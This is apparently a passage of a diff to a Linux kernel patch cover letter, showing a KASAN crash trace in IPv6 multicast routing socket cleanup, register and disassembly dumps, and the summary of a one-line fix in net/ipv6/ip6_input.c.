+[  233.994697][T10483]  check_panic_on_warn (build/../kernel/panic.c:527 (discriminator 1))
+[  233.995387][T10483]  end_report (build/../include/linux/srcu.h:634 build/../include/trace/events/error_report.h:69 build/../include/trace/events/error_report.h:69 build/../mm/kasan/report.c:222)
+[  233.995994][T10483]  kasan_report (build/../mm/kasan/report.c:597)
+[  233.996621][T10483]  ? sock_pfree (build/../net/core/sock.c:3919)
+[  233.997277][T10483]  sock_pfree (build/../net/core/sock.c:3919)
+[  233.997878][T10483]  skb_release_head_state (build/../net/core/skbuff.c:1164)
+[  233.998614][T10483]  sk_skb_reason_drop (build/../include/linux/refcount.h:395 build/../include/linux/refcount.h:432 build/../include/linux/refcount.h:450 build/../include/linux/skbuff.h:1292 build/../net/core/skbuff.c:1212 build/../net/core/skbuff.c:1240)
+[  233.999304][T10483]  ip6mr_destroy_unres (build/../net/ipv6/ip6mr.c:783 build/../net/ipv6/ip6mr.c:810)
+[  234.000008][T10483]  mroute_clean_tables (build/../include/linux/instrumented.h:112 build/../include/asm-generic/bitops/instrumented-lock.h:57 build/../include/linux/bit_spinlock.h:40 build/../include/linux/rhashtable.h:328 build/../include/linux/rhashtable.h:1063 build/../include/linux/rhashtable.h:1144 build/../include/linux/rhashtable.h:1195 build/../net/ipv4/ipmr.c:1344)
+[  234.000780][T10483]  ? __pfx_mroute_clean_tables (build/../net/ipv4/ipmr.c:3147)
+[  234.001562][T10483]  ? do_raw_spin_lock (build/../arch/x86/include/asm/atomic.h:107 (discriminator 4) build/../include/linux/atomic/atomic-arch-fallback.h:2170 (discriminator 4) build/../include/linux/atomic/atomic-instrumented.h:1302 (discriminator 4) build/../include/asm-generic/qspinlock.h:111 (discriminator 4) build/../kernel/locking/spinlock_debug.c:116 (discriminator 4))
+[  234.002275][T10483]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
+[  234.003037][T10483]  ? nlmsg_notify (build/../include/net/netlink.h:1163 build/../include/net/netlink.h:1184 build/../net/netlink/af_netlink.c:2593)
+[  234.003689][T10483]  ip6mr_sk_done (build/../net/ipv6/ip6mr.c:1627 (discriminator 7))
+[  234.004359][T10483]  rawv6_close (build/../net/ipv6/raw.c:1163)
+[  234.004949][T10483]  inet_release (build/../net/ipv4/af_inet.c:443)
+[  234.005587][T10483]  __sock_release (build/../net/socket.c:722)
+[  234.006239][T10483]  sock_close (build/../net/socket.c:1514 (discriminator 1))
+[  234.006828][T10483]  __fput (build/../fs/file_table.c:505)
+[  234.007408][T10483]  __x64_sys_close (build/../fs/open.c:1501 (discriminator 1) build/../fs/open.c:1492 (discriminator 1) build/../fs/open.c:1492 (discriminator 1))
+[  234.008100][T10483]  do_syscall_64 (build/../include/linux/entry-common.h:109 (discriminator 2) build/../include/linux/entry-common.h:147 (discriminator 2) build/../include/linux/entry-common.h:178 (discriminator 2) build/../arch/x86/entry/syscall_64.c:89 (discriminator 2))
+[  234.008743][T10483]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
+[  234.009574][T10483] RIP: 0033:0x7f2cf3098687
+[  234.010187][T10483] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
+All code
+========
+   0:	48 89 fa             	mov    %rdi,%rdx
+   3:	4c 89 df             	mov    %r11,%rdi
+   6:	e8 58 b3 00 00       	call   0xb363
+   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
+  11:	59                   	pop    %rcx
+  12:	5e                   	pop    %rsi
+  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
+  17:	74 1a                	je     0x33
+  19:	5b                   	pop    %rbx
+  1a:	c3                   	ret
+  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
+  22:	00 
+  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
+  28:	0f 05                	syscall
+  2a:*	5b                   	pop    %rbx		<-- trapping instruction
+  2b:	c3                   	ret
+  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+  33:	83 e2 39             	and    $0x39,%edx
+  36:	83 fa 08             	cmp    $0x8,%edx
+  39:	75 de                	jne    0x19
+  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63
+
+Code starting with the faulting instruction
+===========================================
+   0:	5b                   	pop    %rbx
+   1:	c3                   	ret
+   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
+   9:	83 e2 39             	and    $0x39,%edx
+   c:	83 fa 08             	cmp    $0x8,%edx
+   f:	75 de                	jne    0xffffffffffffffef
+  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
+[  234.013809][T10483] RSP: 002b:00007ffc31527620 EFLAGS: 00000202 ORIG_RAX: 0000000000000003
+[  234.015292][T10483] RAX: ffffffffffffffda RBX: 00007f2cf3004780 RCX: 00007f2cf3098687
+[  234.016667][T10483] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000003
+[  234.018064][T10483] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
+[  234.019365][T10483] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000a83590
+[  234.020465][T10483] R13: 00007f2cf3340180 R14: 0000000000000000 R15: 00007f2cf3340188
+[  234.021975][T10483]  </TASK>
+[  234.022699][T10483] Kernel Offset: disabled
+[  234.023317][T10483] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
 Best regards,
-Tangxin Xie
+Zhiling Zou
 
+Zhiling Zou (1):
+  ipv6: orphan prefetched skb before ip6_mr_input
+
+ net/ipv6/ip6_input.c | 1 +
+ 1 file changed, 1 insertion(+)
+
+-- 
+2.43.0
